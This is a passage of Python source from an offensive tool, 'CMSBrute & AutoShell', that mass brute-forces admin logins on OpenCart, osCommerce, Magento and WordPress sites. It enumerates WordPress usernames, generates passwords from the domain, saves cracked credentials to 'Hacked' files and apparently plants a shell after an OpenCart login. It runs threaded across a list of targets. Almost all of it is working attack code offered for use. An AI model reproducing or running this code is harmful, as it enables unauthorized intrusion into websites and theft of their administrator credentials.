					rez(site,'OpencartBruteForce','1')
					with open('result/Opencart_Hacked.txt','a') as wr:
						wr.write('http://'+site+ '/admin/index.php'+'\n Username: {}'.format(username)+'\n Password: '+passwd+'\n-----------------------------------------\n')
					OpencartAutoShell(site,sess,';token=(.*)">',login.content.decode("utf-8"),'token=')
					break
				else:
					rez(site," Opencart "+"| "+username+" | "+passwd,"n1")
			except Exception as e:
				rez(site,'Connection','5')
#--------------------------------------------------------------#
#OsCommerce Brute Force
def osCommerce(site):
	passlist = passw
	if ToolConfig["fileuser"] == True:
		userlist = othereusers
		userlist.append(site.replace("www.","").split(".")[0]+"@"+site.replace("www.",""))
		userlist.append(site.replace("www.",""))
		passlist.append(site.replace("www.",""))
		passlist.append(site.replace("www.","")+site.replace("www.",""))
		passlist.append(site.replace("www.","")+"1")
		passlist.append(site.replace("www.","")+"12")
		passlist.append(site.replace("www.","")+'123')
		passlist.append(site.replace("www.","")+'1234')
		passlist.append(site.replace("www.","")+'12345')
		if "." in site:
			userlist.append(site.replace("www.","").split(".")[0])
			passlist.append(site.replace("www.","").split(".")[0])
			passlist.append(site.replace("www.","").split(".")[0]+"1")
			passlist.append(site.replace("www.","").split(".")[0]+"12")
			passlist.append(site.replace("www.","").split(".")[0]+"123")
			passlist.append(site.replace("www.","").split(".")[0]+"1234")
			passlist.append(site.replace("www.","").split(".")[0]+"1235")
	else:
		userlist = ["admin"]
	for username in userlist:
		for passwd in passlist:
			passwd = FILTERPASS(username,passwd,site,passlist)
			if passwd == False:
				continue
			try:
				post = {}
				post['username'] = username
				post['password'] = passwd
				url = "http://" + site + "/admin/login.php?action=process"
				try:
					login = requests.post(url, data=post, headers=headers, timeout=25,verify=False)
				except:
					login = requests.post(url, data=post, headers=headers, timeout=25,verify=False)
				txt = login.content.decode("utf-8")
				if '/admin/login.php?action=logoff' in login.content.decode("utf-8") and "type='password'" not in (txt.lower()).replace('"',"'"):
					rez(site," osCommerce"+"| "+username+" | "+passwd,"1")
					with open('result/osCommerce_Hacked.txt', 'a') as writer:
						writer.write('http://'+site+'/admin/'+'\n Username: '+username+'\n Password: '+passwd + '\n\n')
					break
				else:
					rez(site," osCommerce "+"| "+username+" | "+passwd,"n1")
			except Exception as e:
				pass
#--------------------------------------------------------------#
#Magento BruteForce
def magento(site):
	passlist = passw
	if ToolConfig["fileuser"] == True:
		userlist = othereusers
		userlist.append(site.replace("www.","").split(".")[0]+"@"+site.replace("www.",""))
		userlist.append(site.replace("www.",""))
		passlist.append(site.replace("www.",""))
		passlist.append(site.replace("www.","")+site.replace("www.",""))
		passlist.append(site.replace("www.","")+"1")
		passlist.append(site.replace("www.","")+"12")
		passlist.append(site.replace("www.","")+'123')
		passlist.append(site.replace("www.","")+'1234')
		passlist.append(site.replace("www.","")+'12345')
		if "." in site:
			userlist.append(site.replace("www.","").split(".")[0])
			passlist.append(site.replace("www.","").split(".")[0])
			passlist.append(site.replace("www.","").split(".")[0]+"1")
			passlist.append(site.replace("www.","").split(".")[0]+"12")
			passlist.append(site.replace("www.","").split(".")[0]+"123")
			passlist.append(site.replace("www.","").split(".")[0]+"1234")
			passlist.append(site.replace("www.","").split(".")[0]+"1235")
	else:
		userlist = ["admin"]
	for username in userlist:
		for passwd in passlist:
			try:
				passwd = FILTERPASS(username,passwd,site,passlist)
				if passwd == False:
					continue
			except Exception as e:
				print(e)
			try:
				post = {}
				post['username'] = username
				post['password'] = passwd
				url = "http://"+site+"/index.php/admin/"
				try:
					login = requests.post(url, data=post, headers=headers, timeout=25,verify=False)
				except:
					login = requests.post(url, data=post, headers=headers, timeout=25,verify=False)
				txt = login.content.decode("utf-8")
				if 'Log out' in login.content.decode("utf-8") and "type='password'" not in (txt.lower()).replace('"',"'"):
					rez(site," Magento "+"| "+username+" | "+passwd,"1")
					with open('result/magent_hacked.txt', 'a') as writer:
						writer.write('http://'+site+'/index.php/admin/'+'\n Username: admin'+'\n Password: '+passwd + '\n\n')
					break
				else:
					rez(site," Magento "+"| "+username+" | "+passwd,"1b")
			except Exception as e:
				pass
#--------------------------------------------------------------#
def RunAll(site):
	check = Cms(site,"0")
	if check == 'wordpress':
		Wp(site)
	elif check == 'joomla':
		Joomla(site)
	elif check == 'drupal':
		Drupal(site)
	elif check == 'opencart':
		opencart(site)
	elif check == 'oscommerce':
		osCommerce(site)
	elif check == 'magento':
		magento(site)
def Wp(site):
	wordpressuserlist = []
	passlist = passw+['wp@admin','wpadmin','wp_admin','wordpress','word@press','wordpressadmin']
	if ToolConfig["wp"] == True:
		check = "wordpress"
	else:
		check = Cms(site,"1")
	if check == 'wordpress':
		if ToolConfig["fileuser"] == True:
			sess = requests.session()
			for i in range(10):
				try:
					try:
						s = sess.get('http://'+site+'/?author={}'.format(str(i + 1)),headers=headers,timeout=25,verify=False)
					except:
						s = sess.get('http://'+site+'/?author={}'.format(str(i + 1)),headers=headers,timeout=25,verify=False)
					find = re.findall('/author/(.*)/"',s.url)
					wordpressuserlist.append(find[0].replace("-"," "))
				except:
					pass
			if not len(wordpressuserlist) == 0:
				pass
			else:
				for i in range(10):
					try:
						try:
							s2 = sess.get('http://'+site+ '/wp-json/wp/v2/users/'+str(i + 1),headers=headers,timeout=25,verify=False)
						except:
							s2 = sess.get('http://'+site+ '/wp-json/wp/v2/users/'+str(i + 1),headers=headers,timeout=25,verify=False)
						jn = json.loads(s2.text)
						if 'id' not in str(jn):
							pass
						else:
							try:
								wordpressuserlist.append(str(jn['slug']).replace("-"," "))
							except:
								pass
					except:
						pass
			if not len(wordpressuserlist) == 0:
				pass
			else:
				wordpressuserlist.append('admin')
			for i in wordpressuserlist:
				passlist.append(i)
				passlist.append(i+"1")
				passlist.append(i+"12")
				passlist.append(i+"123")
				passlist.append(i+"1234")
				passlist.append(i+"12345")
		else:
			wordpressuserlist.append("admin")
		for username in wordpressuserlist:
			for passwd in passlist:
				passwd = FILTERPASS(username,passwd,site,passlist)
				if passwd == False:
					continue
				WpLogin(site,username,passwd)
def Jom(site):
	check = Cms(site,"2")
	if check == 'joomla':
		Joomla(site)
def Dup(site):
	check = Cms(site,"3")
	if check == 'drupal':
		Drupal(site)
def Op(site):
	check = Cms(site,"4")
	if check == 'opencart':
		opencart(site)
def oscom(site):
	check = Cms(site,"5")
	if check == 'oscommerce':
		osCommerce(site)
def Mg(site):
	check = Cms(site,"0")
	if check == 'magento':
		magento(site)
def whatcms(site):
	Cms(site,"0")
def OnTool(toolname,myfunc):
	os.system(['clear', 'cls'][(os.name == 'nt')])
	if "[FAST]" in toolname:
		pass
	else:
		print(r+logo+"""\n    {}I Don't Aspect Any Responsibility For Bad Ussage!{}\n\n Author: {}The Black_Phish{}\n Name: {}{}{}\n Application: {}Python 2.7 & 3.9 Supported{}\n Chose a Tool:{}\n  1. Run With Default User\n  2. Run With Wordlist User
 """.format(g,y,c,y,c,toolname,y,c,m,w))
		cmd = Ret(g+" Choice"+w+":"+c+"~"+m+"# "+r)
		if cmd == "2":
			ToolConfig["fileuser"] = True
		else:
			pass
	os.system(['clear', 'cls'][(os.name == 'nt')])
	print(r+logo+"""\n{}	Author:{} Black_Phish\n	{}Name: {}{}\n""".format(y,c,y,c,toolname))
	dorks = Ret(g+" EnterList"+w+":"+c+"~"+m+"# "+r)
	th = Ret(g+" Threads"+w+":"+c+"~"+m+"# "+r)
	dork = open(dorks,"r").read().splitlines()
	os.system(['clear', 'cls'][(os.name == 'nt')])
	SpeedX(myfunc,dork,th)
def ChoiceTool():
	os.system(['clear', 'cls'][(os.name == 'nt')])
	print(r+logo+"""\n    {}I Don't Aspect Any Responsibility For Bad Ussage!{}\n\n Author: {}The Black_Phish{}\n Name: {}CMSBrute & AutoShell{}\n Application: {}Python 2.7 & 3.9 Supported{}\n Chose a Tool:{}\n  1. Run All CMS BruteForce\n  2. BruteForce Wordpress CMS\n  3. BruteForce Joomla CMS\n  4. BruteForce Opencart CMS\n  5. BruteForce Drupal CMS\n  6. BruteForce osCommerce CMS\n  7. BruteForce Magento CMS\n  8. Best CMS Detector [FAST]\n  9. SET BruteForce Wordlist
 """.format(g,y,c,y,c,y,c,m,w))
	cmd = Ret(g+" [{}root{}@{}salahdin{}:{}~{}]{}# {}".format(g,r,y,g,c,g,m,r))
	if cmd == "1":
		ToolConfig["wp"] = True
		OnTool("Brute All CMS",RunAll)
	elif cmd == "2":
		OnTool("Wordpress BruteForce",Wp)
	elif cmd == "3":
		OnTool("Joomla BruteForce",Jom)
	elif cmd == "4":
		OnTool("Opencart BruteForce",Op)
	elif cmd == "5":
		OnTool("Drupal BruteForce",Dup)
	elif cmd == "6":
		OnTool("osCommerce BruteForce",oscom)
	elif cmd == "7":
		OnTool("Magento BruteForce",Mg)
	elif cmd == "8":
		OnTool("CMS Detector [FAST]",whatcms)
	elif cmd == "9":
		SETWordlist()
	else:
		ChoiceTool()
ChoiceTool()